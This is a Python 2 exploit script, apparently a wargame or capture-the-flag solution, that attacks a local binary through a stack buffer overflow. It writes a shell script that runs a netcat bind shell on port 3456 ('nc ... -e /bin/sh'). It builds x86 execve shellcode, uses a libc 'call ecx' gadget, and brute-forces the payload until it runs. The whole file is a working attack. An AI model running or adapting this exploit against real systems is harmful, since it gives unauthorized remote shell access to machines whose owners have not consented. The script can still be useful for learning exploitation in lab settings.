#!/usr/bin/env python

import os
import re
import stat
import struct
import subprocess
import sys


SCRIPT = """#!/bin/sh

nc -v -n -l -p 3456 -e /bin/sh
"""


def le(num):
     return struct.pack("<I",num)


def run(cmd):
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
    out, err = p.communicate()
    return out.strip()


def get_libc(sc):
    r = run('ldd "{:s}" | grep libc'.format(so_close))
    r = r.split("=>")[1].strip()
    lib  = r[:r.find(" ")]
    addr = int(re.search("0x[0-9A-Fa-f]+", r).group(0), 16)
    return lib, addr


def build_shellcode(script):
    """
    execve syscall
    ==============
     0:   31 c0                   xor    %eax,%eax
     2:   50                      push   %eax
    [...push string...]
     8:   89 e3                   mov    %esp,%ebx
     a:   89 c1                   mov    %eax,%ecx
     c:   89 c2                   mov    %eax,%edx
     e:   b0 0b                   mov    $0xb,%al
    10:   cd 80                   int    $0x80
    """
    sc = ["\x31\xC0\x50"]

    # Write pushes (0x68 + 4 bytes from the script path)
    for i in xrange(len(script) / 4):
        sc.append("\x68" + script[i * 4:(i + 1) * 4])

    sc.append("\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80")
    return "".join(sc)


def get_call_ecx(fpath, k=0):
    """
    \xFF\xD1 = call ecx
    """
    data = open(fpath, "rb").read()
    call_ecx = list(re.finditer('\xFF\xD1', data))[k].start()
    return call_ecx


def build_exploit(libc_base, sh, ecx):
    # align 4 the shellcode
    sh = '\x90' * (4 - len(sh) % 4 if len(sh) % 4 != 0 else 0) + sh
    # int to 4 byte little-endian
    ecx = le(ecx)
    
    return sh + ecx * ((268 - len(sh)) / 4) + '\x00'


def chmod_x(path):
    st = os.stat(path)
    os.chmod(path, st.st_mode | stat.S_IEXEC)


def deploy_script(path):
    f = open(path, "wb")
    f.write(SCRIPT)
    f.close()
    chmod_x(path)
    

def brute_worker(so_close, sploit, verbose):
    stderr = None if verbose else subprocess.PIPE
    p = subprocess.Popen(so_close, stdin=subprocess.PIPE, stderr=stderr, shell=True)
    p.communicate(sploit)
    

def bruteforce(so_close, sploit, verbose=True):
    while True:
        brute_worker(so_close, sploit, verbose)
    

def guess_libc_addr(fpath, k=100):
    d = dict()
    for i in xrange(100):
        _, a = get_libc(so_close)
        if a not in d:
            d[a] = 1
        else:
            d[a] += 1
    libc_addr = max(d, key=d.get)
    return libc_addr
    
    
def cleanup(script):
    os.remove(script)
    

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print "Usage:", sys.argv[0], "<so_close>"
        exit()
    so_close = sys.argv[1]
    script = "./bb"
    
    print "================================================="
    
    script = script + ' ' * (4 - len(script) % 4 if len(script) % 4 != 0 else 0)
    deploy_script(script)
    print "Shell Script:   {}".format(script)
    
    
    #libc, _   = get_libc(so_close)
    #libc_addr = guess_libc_addr(so_close, k=200)
    libc, libc_addr = get_libc(so_close)
    print "Libc Path   :   {}".format(libc)
    print "Libc Address:   0x{:08X}".format(libc_addr)
    
    call_ecx = libc_addr + get_call_ecx(libc, k=2)
    print "Call ECX    :   0x{:08X}".format(call_ecx)
    
    shellcode = build_shellcode(script)
    print "Shellcode   :   {:<4} bytes".format(len(shellcode))
    
    #TODO: Check for nulls in libc_addr
    
    exploit = build_exploit(libc_addr, shellcode, call_ecx)
    print "Exploit     :   {:<4} bytes".format(len(exploit))
    
    print "================================================="
    
    print "Bruteforcing!\n"
    try:
        bruteforce(so_close, exploit)
    except KeyboardInterrupt:
        pass

    print "\n\nCleaning up..."
    cleanup(script)
